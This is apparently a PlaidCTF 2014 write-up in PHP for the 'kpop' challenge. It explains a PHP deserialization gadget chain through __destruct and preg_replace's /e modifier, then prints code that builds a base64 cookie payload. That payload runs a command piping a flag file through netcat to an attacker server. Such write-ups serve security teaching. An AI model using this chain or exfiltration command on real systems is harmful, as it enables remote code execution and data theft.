<?php

	/*
        mike_pizza
        plaidctf 2014 kpop writeup

        This challenge presented the PHP source code to a website. The website used
        an object oriented design to implement a lyric sharing application. 

        Among the notable things in the application were its logging system and its 
        lyric storage. To store lyrics on a per-user basis the application would 
        entrust each user with a lyric cookie. This cookie would be decoded and 
        unserialized when the application want to get at this lyric data. The other 
        interesting thing about this application was its use of the preg_replace
        function. This function would be called by a method of the OutputFilter object.
        Two arguments to preg_replace were controlled by the OutputFilter's instance
        variables. Keep in mind that preg_replace is notorious for it's 'e' modifier
        in the $pattern parameter. When /x/e is used, the $replacement argument will
        be evaluated as PHP code. Tracing the call through object instantiations seems
        to suggest that we have no control direct control over the arguments to 
        preg_replace.. or do we?

        During the trace of this preg_replace call we notice that the Lyric class
        has a special method '__destruct' defined. This method will be called whenever
        a Lyric object goes out of scope.

        Serialization also allows to represent things beyond just primitives, we can 
        serialize objects as well. So thats our attack. We serialize a Lyric object
        which itself contains a OutputFilter object whose internal variables contain
        both the $pattern and $replacement argument to preg_replace. We base64 this
        serialized object and set it as our lyric cookie. Now when the server 
        unserializes this Lyric object, it will quickly go out of scope causing the 
        Lyric's object's __destruct method to invoke log() which will eventually 
        invoked preg_replace("/(.*)/e", "system("your favorite command"))

        Below was our method of creating the payload. We included the PHP file 
        containing the class definition. (we also tweaked the definitions of the 
        the constructors to allow us to pass in a Logger object to a Song object.
	*/

	include('classes.php');

	$of = new OutputFilter("/.*/e", "system(\"cat /home/flag/flag | nc <myserver> 31337\")");

	$lff = new LogFileFormat(array($of), '\n');
	$lwf = new LogWriter_File("test", $lff);
	$lgr = new Logger($lwf);
	$sng = new Song("stefan", "esser", "hotshot", $lgr);
	$lyr = new Lyrics("hihi", $sng);

	$serial = serialize($lyr) . "\n";
	$payload = base64_encode($serial);
	
	echo $payload;
